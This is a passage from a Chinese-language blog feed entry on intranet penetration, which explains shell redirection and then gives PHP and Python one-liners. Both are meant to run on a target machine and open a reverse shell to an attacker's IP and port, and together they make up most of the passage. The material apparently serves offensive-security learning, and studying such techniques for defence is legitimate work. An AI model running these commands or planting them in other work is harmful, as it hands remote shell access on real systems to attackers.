(stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; </p></li><li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;</p></li></ol></blockquote><ul><li>在此处不论是 “0&gt;&amp;1” 或者 “0&lt;&amp;1”  都是将标准输入重定向到标准输出中； “&gt;&amp;” 和 “&amp;&gt;” 也是同样效果；</li></ul><h3 id="PHP反向shell"><a href="#PHP反向shell" class="headerlink" title="PHP反向shell"></a>PHP反向shell</h3><p>适用于目标机上存在php服务，绝大多数服务器上都会是这种情况。我们在目标机上执行下面命令以反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock = fsockopen("192.168.100.113（攻击机ip）"，8888);exec("/bin/sh -i &lt;&amp;3&gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><h3 id="Python反向shell"><a href="#Python反向shell" class="headerlink" title="Python反向shell"></a>Python反向shell</h3><p>python不多说了，几乎每台机器都有。在目标机上用一下命令反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.113",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p = subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure><p>还有更多的姿势会在后面补充。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;内网渗透工具总结之netcat&quot;&gt;&lt;a href=&quot;#内网渗透工具总结之netcat&quot; class=&quot;headerlink&quot; title=&quot;内网渗透工具总结之netcat&quot;&gt;&lt;/a&gt;内网渗透工具总结之netcat&lt;/h1&gt;&lt;p&gt;继续上一篇的思路，继续学习总结内网穿
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://bai-ren-1.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
</feed>
